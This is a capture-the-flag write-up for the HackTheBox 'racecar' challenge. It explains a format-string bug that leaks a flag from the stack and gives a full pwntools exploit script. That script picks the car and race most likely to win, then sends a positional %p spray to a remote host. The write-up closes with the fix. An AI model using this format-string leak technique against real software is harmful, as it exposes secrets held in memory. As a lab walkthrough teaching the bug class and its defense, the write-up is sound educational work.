## Overview

`racecar` is a Very Easy HackTheBox **Pwn** challenge: a small 32-bit CLI racing game (PIE, Full RELRO, stack canary, NX — every protection on). None of those matter, because the only interesting code path contains a textbook [format string](https://cwe.mitre.org/data/definitions/134.html) bug that prints attacker input directly. The flag is read onto the stack just before that `printf`, so a `%p` spray reads it straight back.

## The technique

After you win a race, the program does roughly this:

```c
fp = fopen("flag.txt", "r");
fgets(flag, 44, fp);        // flag is now sitting on the stack
read(0, buf, 0x170);        // it reads YOUR "winner message"
puts("... wants the whole world to know this:");
printf(buf);               // BUG: your input is the format string
```

A safe call would be `printf("%s", buf)`. Because the format string is missing, every `%p`/`%x`/`%s` you type makes `printf` walk the stack and print what it finds — and the flag bytes are right there from the `fgets` a moment earlier. This is a pure **read** primitive: there is nothing to bypass, the secret is already in the frame.

One wrinkle: that `printf` only runs if you **win** the `rand()`-based race. Reading the disassembly, the win check depends on which car and race you pick:

| Car | Race | your value | threshold | win when |
|-----|------|-----------|-----------|----------|
| 1 | 2 (Circuit) | `rand()%10` | `rand()%100` | value `<` threshold (~94%) |
| 2 | 1 (Highway) | `rand()%100` | `rand()%10` | value `>` threshold (~94%) |
| other combos | | | | ~5% |

So **car 1 + race 2** wins almost every time — pick the lopsided combo and retry the rare loss instead of fighting the PRNG.

## Solution

The full exploit (`solve.py`):

```python
from pwn import *
import re, sys
context.arch = 'i386'

# 44 positional reads; the flag (fgets'd onto the stack) lands among these.
PAYLOAD = b'.'.join(b'%%%d$p' % i for i in range(1, 45))

def attempt(p):
    p.recvuntil(b'Name:');       p.sendline(b'pwn')
    p.recvuntil(b'Nickname:');   p.sendline(b'pwn')
    p.recvuntil(b'>');           p.sendline(b'2')   # Car selection
    p.recvuntil(b'Select car');  p.recvuntil(b'>'); p.sendline(b'1')  # my  = rand()%10
    p.recvuntil(b'Select race'); p.recvuntil(b'>'); p.sendline(b'2')  # thr = rand()%100
    data = p.recvrepeat(8)
    if b'won the race' not in data:    # ~5% unlucky -> retry
        return None
    p.sendline(PAYLOAD)                # the format-string leak
    return p.recvrepeat(3)

def decode(leak):
    raw = b''
    for h in re.findall(rb'0x[0-9a-fA-F]+', leak):
        raw += p32(int(h, 16) & 0xffffffff)   # each %p word -> 4 ASCII bytes (little-endian)
    return re.search(rb'HTB\{[^}]*\}', raw).group(0)

host, port = sys.argv[1], int(sys.argv[2])
while True:
    p = remote(host, port)
    out = attempt(p)
    p.close()
    if out:
        print(decode(out).decode())
        break
```

Win the race, send the spray, and the leaked words reassemble into the flag:

```
...0x7b425448 0x65386334 0x32353561 ...   ->  "HTB{4c8e a552 ..."
   ( "HTB{"     "4c8e"     "a552"  ... — each 4-byte %p word, little-endian )
```

Output: `HTB{...}` (redacted).

## Why it worked

`printf` pulls its arguments from the stack based on the format string. When the *caller* lets the user control that format string, the user controls which memory `printf` reads. The flag had just been loaded onto the stack by `fgets`, so a positional `%p` spray dumps it. No ASLR/PIE/canary work is needed because we never redirect control flow — we only read.

## Fix / defense

Never pass user data as the format string. Use a constant:

```c
printf("%s", buf);    // safe
```

Compilers flag this with `-Wformat -Wformat-security`; treat the warning as an error. The same [externally-controlled format string](https://cwe.mitre.org/data/definitions/134.html) bug class also enables arbitrary **writes** via `%n`, so it is not "just an info leak" in the general case.
